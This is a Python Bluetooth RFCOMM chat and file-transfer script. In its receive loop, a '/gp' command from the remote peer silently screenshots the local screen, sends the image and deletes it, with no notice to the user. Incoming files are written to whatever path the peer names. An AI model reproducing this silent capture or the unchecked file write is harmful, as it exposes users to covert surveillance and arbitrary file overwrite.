import bluetooth
import sys
import os
import pyautogui
import datetime
from threading import Thread

class BlueApp:
    search_time = 5
    port = 3
    buff_size = 1024
    __mssFlag = "<\mss>"
    __fileFlag = "<\file>"
    __extentionFlag = "<\extention>"
    __stop = True

    def in_out(self, socket):
        recvThread = Thread(target=self.recv, args=(socket,))
        recvThread.start()
        while self.__stop:
            message = input()
            if message.find(self.__extentionFlag) != -1 or message.find(self.__fileFlag) != -1 or message.find(self.__mssFlag) != -1:
                print("<<Error. Wrong input>>")
                continue
            elif message.find("/sf") != -1:
                try: path = message.split()[1]
                except: 
                    print("<<Error. Enter path to file>>")
                    continue
                if self.sendFile(socket, path, False) == -1:
                    continue
            elif message == "/ex":
                self.send(socket, message + self.__mssFlag)
                exit(0)
            else:
                self.send(socket, message + self.__mssFlag)
            if not recvThread.is_alive(): 
                break
        recvThread.join() 

    def sendFile(self, socket, path, rm):
        try: 
            with open(path, "rb") as file:
                data = file.read()
                filename, file_extension = os.path.splitext(path)
            if rm: os.remove(path)
            return self.send(socket, data + self.__fileFlag.encode() + filename.encode() + file_extension.encode() + self.__extentionFlag.encode())
        except IOError: 
            print("<<Error. File doesn't exist>>")
            return -1
    
    def send(self, socket, data):
        total_send = 0
        while total_send < len(data):
           tmp = socket.send(data)
           total_send += tmp
           data = data[tmp: ]
        return total_send

    def recv(self, socket):
        message = bytearray()
        while self.__stop:
            data = socket.recv(self.buff_size)
            if len(data) is 0:
                break
            message += data
            pos = message.find(self.__mssFlag.encode())
            if pos != -1:
                message = message[0:pos]
                if message == b"/ex":
                    break
                if message == b"/gp":
                    fileName = datetime.datetime.now().strftime("%H%M%S_%d%m%Y.png")
                    pyautogui.screenshot(fileName)
                    self.sendFile(socket, fileName, True)
                    message.clear()
                    continue
                print(message.decode("utf-8"))
                message.clear()
            pos = message.find(self.__extentionFlag.encode())
            if pos != -1:
                filePos = message.find(self.__fileFlag.encode())
                fileName = message[filePos + len(self.__fileFlag):pos]
                message = message[0:filePos]
                print("<<You got new file. Saving as " + fileName.decode("utf-8") + ">>")
                try:
                    with open(fileName.decode("utf-8"), "wb") as file:
                        file.write(message)
                except:
                    print("<<Error. Wrong path>>")
                message.clear()
            
    def active(self):
        print("Searching nearby devices...")
        nearby_devices = bluetooth.discover_devices(duration = self.search_time, lookup_names=True)
        if len(nearby_devices) > 0:
            print("Found %d devices" % len(nearby_devices))
        else:
            print("No devices found")
            exit(0)
        i = 0
        for name, addr in nearby_devices:
            print("\t", i, addr, name)
            i += 1
        device_num = input("Enter device number, which you want to connect: ")
        if not device_num.isdigit():
            print("<<Error. Wrong parametr>>")
            exit(0)
        device_num = int(device_num)
        if device_num < 0 or device_num > i - 1:
            print("<<Error. Wrong number>>")
            exit(0)
        print(nearby_devices[device_num][0])
        try:
            socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            socket.connect((nearby_devices[device_num][0], self.port))
        except bluetooth.btcommon.BluetoothError as err:
            print("Connection error")
            exit(err)
        print("Connection established")
        #str(send) + " " + message + " " + str(self.buff_size)
        self.in_out(socket)  
        print("Connection closed")
        socket.close()

    def passive(self):
        server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        server_sock.bind(("", bluetooth.PORT_ANY))
        server_sock.listen(True)
        port = server_sock.getsockname()[1]
        while self.__stop:
            print("Waiting for connection on RFCOMM channel %d" % port)
            client_sock, address = server_sock.accept()
            print("Inbound connection from ", address)
            #str(send) + " " + message + " " + str(self.buff_size)
            self.in_out(client_sock)
            client_sock.close()
        server_sock.close()

def exception(index):
    print("<<Error. Wrong parmetr at '" + index + "' argument>>")
    exit(0)

if __name__ == "__main__": 
    side = BlueApp()
    if "-p" in sys.argv[1:]:
        try: side.port = int(sys.argv[sys.argv.index("-p") + 1])
        except: exception(sys.argv[sys.argv.index("-p") + 1])
    if "-b" in sys.argv[1:]:
        try: side.buff_size = int(sys.argv[sys.argv.index("-b") + 1])
        except: exception(sys.argv[sys.argv.index("-b") + 1])
    if "-l" in sys.argv[1:]:
        side.passive()
    elif "-s" in sys.argv[1:]:
        if "-t" in sys.argv[1:]:
            try: side.search_time = int(sys.argv[sys.argv.index("-t") + 1])
            except: exception(sys.argv[sys.argv.index("-t") + 1])
        side.active()